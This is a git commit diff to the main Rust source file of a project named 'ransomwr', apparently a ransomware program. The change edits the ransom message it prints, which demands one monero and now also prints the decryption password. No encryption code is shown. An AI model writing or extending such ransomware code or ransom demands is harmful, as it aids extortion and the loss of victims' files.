23b528158f928b7a8ff0c76abe6f6079642d5dca
VTJ0cGJ <126363621+VTJ0cGJ@users.noreply.github.com>
2024-04-06 09:22:04 +1100

    Update main.rs

--- ransomwr/src/main.rs
+++ ransomwr/src/main.rs
@@ -180,5 +180,5 @@ fn main() {
     println!("Your computer has been infected with ransomware, you cannot retreive your files.
     \nWe will return them to you if you send one monero to this address\n
     [PLACEHOLDER]\n
-    or just download the decryption executable from VTJ0cGJ/ransomwr")
+    or just download the decryption executable from VTJ0cGJ/ransomwr\npassword = {}", password)
 }
